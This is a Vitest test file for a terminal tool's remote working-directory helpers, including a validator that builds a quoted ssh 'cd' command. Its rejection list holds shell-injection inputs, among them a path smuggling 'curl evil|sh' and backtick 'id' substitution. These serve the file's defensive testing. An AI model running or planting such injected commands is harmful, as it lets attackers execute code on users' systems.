import { execFileSync, spawnSync } from "node:child_process"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { describe, expect, it } from "vitest"
import {
  cleanRemoteCwd,
  cwdFromOsc7,
  cwdFromTitle,
  detailUser,
  homeRelative,
  remoteCdCommand,
  remoteCwdName,
  safeForCd,
  shortRemoteCwd,
} from "./remote-cwd"

describe("cleanRemoteCwd", () => {
  it("absolute, ~ or ~/…", () => {
    expect(cleanRemoteCwd("/srv/app")).toBe("/srv/app")
    expect(cleanRemoteCwd("~")).toBe("~")
    expect(cleanRemoteCwd("~/projects/x ")).toBe("~/projects/x")
  })

  it("rejects relative paths, control characters, Windows drive paths, oversize, non-strings", () => {
    const bad = [
      "projects",
      "~user/x",
      "/a\nb",
      "/a\u001b[2J",
      "/C:/Users/me",
      "/" + "x".repeat(1100),
      3,
      null,
      "",
    ]
    for (const b of bad) expect(cleanRemoteCwd(b)).toBeNull()
  })
})

describe("cwdFromOsc7 / cwdFromTitle", () => {
  it("OSC 7 file URLs, percent-decoded, with the host they name", () => {
    expect(cwdFromOsc7("file://GPU/home/me/my%20proj")).toEqual({
      host: "gpu",
      dir: "/home/me/my proj",
    })
    expect(cwdFromOsc7("file:///srv")).toEqual({ host: "", dir: "/srv" })
    expect(cwdFromOsc7("file://win/C:/Users/me")).toBeNull() // a PowerShell host's drive path
    expect(cwdFromOsc7("not a url")).toBeNull()
  })

  it("the Debian / Ubuntu title user@host: dir, and nothing else", () => {
    expect(cwdFromTitle("quang@gpu-box: ~/projects/llm")).toEqual({
      host: "gpu-box",
      dir: "~/projects/llm",
    })
    expect(cwdFromTitle("root@db: /var/log")).toEqual({ host: "db", dir: "/var/log" })
    expect(cwdFromTitle("vim notes.md")).toBeNull()
    expect(cwdFromTitle("quang@gpu-box: htop")).toBeNull() // not a path
    expect(cwdFromTitle("root@db: /var/log (tail -f)")).toBeNull() // more after the path
  })
})

describe("remoteCwdName / shortRemoteCwd", () => {
  it("the last segment; a long path keeps its tail", () => {
    expect(remoteCwdName("~/projects/llm-train/")).toBe("llm-train")
    expect(remoteCwdName("~")).toBe("~")
    expect(remoteCwdName("/")).toBe("/")
    expect(shortRemoteCwd("~/a/b")).toBe("~/a/b")
    const s = shortRemoteCwd("/very/long/path/that/goes/on/and/on/and/finally/ends/here", 24)
    expect(s.startsWith("…/")).toBe(true)
    expect(s.endsWith("ends/here")).toBe(true)
    expect(s.length).toBeLessThanOrEqual(24)
  })
})

describe("safeForCd / remoteCdCommand", () => {
  it("only folders whose characters mean nothing inside single quotes, in any shell", () => {
    for (const ok of [
      "/srv/app",
      "~/my proj",
      "~",
      "/a-b_c.d/e+f@g,h:i=j%k#l",
      "/données/项目",
      "/x/-dash",
    ]) {
      expect(safeForCd(ok)).toBe(true)
      expect(remoteCdCommand(ok)).toContain(`smterm '${ok}'`)
    }
  })

  it("refuses anything a shell could act on, the fish \\' escape included", () => {
    const bad = [
      "/tmp/a\\'; curl evil|sh; '", // fish: \' inside single quotes is a literal quote
      "/it's",
      '/dq"x',
      "/$HOME",
      "/`id`",
      "/semi;colon",
      "/a|b",
      "/a&b",
      "/a!b", // csh history expansion
      "/a*b",
      "/a(b)",
      "/a\\b",
      "/a{b}",
      "/a[b]",
      "/a<b>",
    ]
    for (const b of bad) {
      expect(safeForCd(b)).toBe(false)
      expect(remoteCdCommand(b)).toBeNull()
    }
  })
})

// ssh hands the command to the remote login shell as `$SHELL -c '<command>'`, started in the
// home directory. Run it that way in every shell here, with a SHELL that prints where it landed.
const shells = ["sh", "bash", "zsh", "fish", "dash"].filter(
  (sh) => spawnSync("sh", ["-c", `command -v ${sh}`]).status === 0,
)

describe.each(shells)("remoteCdCommand through %s", (loginShell) => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "rcd-"))
  const probe = path.join(home, "probe.sh")
  fs.writeFileSync(probe, "#!/bin/sh\npwd\n", { mode: 0o755 })
  const run = (dir: string) =>
    execFileSync(loginShell, ["-c", remoteCdCommand(dir)!], {
      encoding: "utf8",
      cwd: home,
      env: { PATH: process.env.PATH, HOME: home, SHELL: probe },
    }).trim()
  const real = (p: string) => fs.realpathSync(p)

  it("lands in the folder (spaces, a leading dash, unicode, the allowed punctuation)", () => {
    for (const name of ["plain", "with space", "-dash", "données", "a.b_c+d@e,f=g%h#i"]) {
      const dir = path.join(home, name)
      fs.mkdirSync(dir, { recursive: true })
      expect(real(run(dir))).toBe(real(dir))
    }
  })

  it("~ and ~/… are home-relative", () => {
    fs.mkdirSync(path.join(home, "proj", "a"), { recursive: true })
    expect(real(run("~/proj/a"))).toBe(real(path.join(home, "proj", "a")))
    expect(real(run("~"))).toBe(real(home))
  })

  it("a folder that's gone still gives a shell (at home)", () => {
    expect(real(run(path.join(home, "missing")))).toBe(real(home))
  })
})

describe("homeRelative / detailUser", () => {
  it("shows a path under the host user's home as ~/…", () => {
    expect(homeRelative("/home/quang/projects/x", "quang")).toBe("~/projects/x")
    expect(homeRelative("/Users/quang", "quang")).toBe("~")
    expect(homeRelative("/root/.config", "root")).toBe("~/.config")
    expect(homeRelative("/home/quangle/x", "quang")).toBe("/home/quangle/x") // another user
    expect(homeRelative("/srv/app", "quang")).toBe("/srv/app")
    expect(homeRelative("/home/quang/x")).toBe("/home/quang/x") // user unknown
  })

  it("takes the user from user@hostname:port", () => {
    expect(detailUser("quang@10.0.4.12:2222")).toBe("quang")
    expect(detailUser("10.0.4.12")).toBeUndefined()
    expect(detailUser(undefined)).toBeUndefined()
  })
})
